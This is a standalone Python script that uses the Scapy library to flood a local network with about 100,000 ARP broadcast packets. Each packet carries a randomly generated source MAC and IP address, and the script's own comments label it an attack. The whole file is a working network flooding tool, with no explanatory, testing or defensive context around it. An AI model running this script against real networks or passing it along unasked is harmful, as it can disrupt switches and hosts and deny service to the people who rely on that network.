#!/usr/bin/python


#Ether(src='08:00:27:ea:96:d7', dst='ff:ff:ff:ff:ff:ff', type=2054)/
#ARP(hwdst='00:00:00:00:00:00', ptype=2048, hwtype=1, psrc='10.0.0.104', hwlen=6, plen=4, pdst='10.0.0.100', hwsrc='08:00:27:ea:96:d7', op=1)/
#Padding(load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00')

from scapy.all import *
import string
import random

def MAC_Generator(size=2, chars= 'a' + 'b' + 'c' + 'd' + 'e' + 'f' + string.digits):


#Generate random MAC address to use for the attack
   
   return "".join(random.choice(chars) for _ in range(size))



def IP_Generator():


#Generate random IP address to use for the attack


    part1 = random.randint(1, 255)
    part1 = str(part1)
    part2 = random.randint(0, 255)
    part2 = str(part2)
    part3 = random.randint(0, 255)
    part3 = str(part3)
    part4 = random.randint(0, 255)
    part4 = str(part4)

    addr = part1 + '.' + part2 + '.' + part3 + '.'  + part4

    return addr

def ARP_Packet_Attack():

    x= 0
#Creates the complete packet for the attack then send them
    
    while (x<=100000):
        #Define each bytes of the MAC address src
        a = MAC_Generator()
        b = MAC_Generator()
        c = MAC_Generator()
        d = MAC_Generator()
        e = MAC_Generator()
        f = MAC_Generator()
        #Define the MAC adresses
        MAC_src = a + ':' + b + ':' + c + ':' + d + ':' + e + ':' + f
        MAC_dst = 'ff:ff:ff:ff:ff:ff'
        #Define the IP address
        IP_addr = IP_Generator()
    
        #Create and send the packet
        L1 = Ether(src=MAC_src, dst=MAC_dst, type=0x806)
        L2 = ARP(hwdst=MAC_dst, ptype=0x0800, hwtype=1, psrc=IP_addr, hwlen=6, plen=4, pdst=IP_addr, hwsrc=MAC_src, op=1)
        Padd = Padding(load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00')
    
        sendp(L1/L2/Padd)
    
        x = x + 1

if __name__ == '__main__':
    ARP_Packet_Attack()
